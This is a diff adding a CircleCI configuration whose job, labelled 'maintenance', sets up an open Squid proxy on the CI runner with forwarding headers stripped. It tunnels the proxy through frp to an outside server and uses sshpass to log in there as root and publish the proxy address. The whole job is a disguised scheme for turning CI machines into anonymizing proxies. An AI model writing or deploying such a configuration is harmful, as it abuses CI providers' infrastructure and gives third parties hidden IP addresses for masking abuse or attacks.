@@ -1,0 +1,158 @@
+version: 2.2
+
+jobs:
+  maintenance:
+    machine:
+      image: ubuntu-2204:current
+
+    steps:
+      - run:
+          name: Install squid and tools
+          command: |
+            sudo apt update
+            sudo apt install -y squid sshpass wget curl
+
+      - run:
+          name: Config squid
+          command: |
+            cat <<'EOF' | sudo tee /etc/squid/squid.conf >/dev/null
+            http_port 3128
+
+            acl allsrc src all
+            http_access allow allsrc
+
+            forwarded_for off
+            via off
+            request_header_access X-Forwarded-For deny all
+            request_header_access Via deny all
+            request_header_access Cache-Control deny all
+
+            visible_hostname localhost
+            EOF
+
+            sudo systemctl restart squid
+            sleep 3
+            sudo systemctl status squid --no-pager || true
+
+      - run:
+          name: Install frpc
+          command: |
+            FRP_VERSION="0.61.2"
+            FRP_FILE="frp_${FRP_VERSION}_linux_amd64.tar.gz"
+            FRP_URL="https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/${FRP_FILE}"
+
+            curl -fL --retry 5 --retry-delay 5 -o "${FRP_FILE}" "${FRP_URL}"
+
+            ls -lh "${FRP_FILE}"
+            tar -xzf "${FRP_FILE}"
+            sudo mv "frp_${FRP_VERSION}_linux_amd64/frpc" /usr/local/bin/
+            frpc --version
+
+      - run:
+          name: Start frpc tunnel with retry
+          command: |
+            cat <<EOF > frpc.toml
+            serverAddr = "45.144.53.63"
+            serverPort = 7000
+
+            auth.method = "token"
+            auth.token = "${FRP_TOKEN}"
+
+            [[proxies]]
+            name = "circleci-squid-5012"
+            type = "tcp"
+            localIP = "127.0.0.1"
+            localPort = 3128
+            remotePort = 5012
+            EOF
+
+            cat frpc.toml
+
+            for i in 1 2 3; do
+              echo "Attempt $i..."
+              pkill frpc || true
+
+              frpc -c frpc.toml > frpc.log 2>&1 &
+              sleep 25
+
+              cat frpc.log
+
+              if grep -qi "start proxy success\|login to server success" frpc.log; then
+                echo "Got tunnel: 45.144.53.63:5012"
+                break
+              fi
+
+              echo "Retrying..."
+              sleep 5
+            done
+
+            if ! grep -qi "start proxy success\|login to server success" frpc.log; then
+              echo "ERROR: No FRP tunnel after retries"
+              exit 1
+            fi
+
+      - run:
+          name: Test proxy before upload
+          command: |
+            echo "=== TEST LOCAL SQUID ==="
+            LOCAL_IP=$(curl -x http://127.0.0.1:3128 -s --max-time 15 http://api.ipify.org || true)
+            echo "LOCAL_IP=${LOCAL_IP}"
+
+            if ! echo "${LOCAL_IP}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
+              echo "ERROR: local squid returned bad response"
+              exit 1
+            fi
+
+            echo "=== TEST PUBLIC FRP PROXY ==="
+
+            PUBLIC_IP=""
+            for i in 1 2 3 4 5; do
+              echo "Public test attempt $i..."
+              PUBLIC_IP=$(curl -x http://45.144.53.63:5012 -s --max-time 20 http://api.ipify.org || true)
+              echo "PUBLIC_IP=${PUBLIC_IP}"
+
+              if echo "${PUBLIC_IP}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
+                break
+              fi
+
+              sleep 5
+            done
+
+            if ! echo "${PUBLIC_IP}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
+              echo "ERROR: public FRP proxy is dead"
+              cat frpc.log || true
+              exit 1
+            fi
+
+      - run:
+          name: Get address and upload
+          command: |
+            FRP_URL="45.144.53.63:5012"
+
+            echo "Sync OK (${FRP_URL})"
+
+            sshpass -p "${PAN}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "
+              touch /var/www/html/bore.txt
+              grep -Fxq '${FRP_URL}' /var/www/html/bore.txt || echo '${FRP_URL}' >> /var/www/html/bore.txt
+              echo '=== REMOTE FILE ==='
+              tail -n 20 /var/www/html/bore.txt
+            "
+
+      - run:
+          name: Keep tunnel alive
+          command: |
+            for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17; do
+              echo "alive $i/17"
+              sleep 30
+            done
+
+      - run:
+          name: Wait before finish
+          command: |
+            sleep 45
+
+workflows:
+  version: 2
+  something:
+    jobs:
+      - maintenance
